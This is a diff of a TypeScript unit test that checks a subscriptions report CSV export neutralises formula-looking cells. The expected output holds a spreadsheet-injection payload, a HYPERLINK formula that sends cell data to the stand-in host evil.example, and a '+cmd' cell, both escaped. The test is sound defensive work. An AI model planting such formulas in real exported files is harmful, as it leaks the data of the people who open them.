@@ -3,7 +3,7 @@ import { SubscriptionsController } from '@/modules/subscriptions/subscriptions.c
 describe('SubscriptionsController business report CSV', () => {
   it('neutralises formula-looking vendor and owner cells', async () => {
     const service = {
-      getBusinessReport: jest.fn().mockResolvedValue({
+      getBusinessReport: vi.fn().mockResolvedValue({
         currency: 'USD',
         rows: [
           {
@@ -21,9 +21,9 @@ describe('SubscriptionsController business report CSV', () => {
       }),
     };
     const controller = new SubscriptionsController(service as never);
-    const res = { setHeader: jest.fn() };
+    const res = { setHeader: vi.fn() };
 
-    const csv = (await controller.businessReport('ws-1', 'csv', res as never)) as string;
+    const csv = (await controller.businessReport('ws-1', { format: 'csv' }, res as never)) as string;
 
     expect(csv).toContain(`"'=HYPERLINK(""http://evil.example/?""&A1,""x"")","'+cmd",10.00`);
   });
